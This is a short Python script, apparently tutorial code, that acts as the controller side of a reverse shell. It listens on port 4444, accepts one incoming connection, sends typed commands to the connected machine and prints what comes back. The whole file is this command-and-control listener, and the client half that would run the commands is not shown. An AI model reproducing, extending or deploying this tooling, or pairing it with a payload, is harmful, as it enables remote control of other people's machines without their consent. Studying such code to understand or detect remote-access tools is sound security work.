import socket 
import sys

#create socket (allows to connnect)


def socket_create():
	try:
		global host
		global port
		global s

		host = ""
		port = 4444
		s = socket.socket()

	except socket.error as msg :
		print("Socket creation error:" +str(msg))


# bind socket to port and wait for connection to connect


def socket_bind():
	try:
		global host
		global port
		global s
		print("blindind socket to port: " + str(port))
		s.bind((host, port))
		s.listen(5)
	except socket.error as msg:
		print("Socket binding error:" + str(msg) + "\n" + "RETRYING ...")

# etablish a connection with client (socket must be listening for them)

def socket_accept():
	conn, address = s.accept()
	print("Connection has been establish | " + "IP" + address[0] + " | Port " + str(address[1]))
	send_commands(conn)
	conn.close()




def send_commands(conn):
	while True:
		cmd = input()
		if cmd == 'quit':
			s.close()
			sys.exit()

		if len(str.encode(cmd)) > 0:
			conn.send(str.encode(cmd))

		client_response = str(conn.recv(1024), "utf-8")
		print(client_response, end="")



def main():
	socket_create()
	socket_bind()
	socket_accept()


main()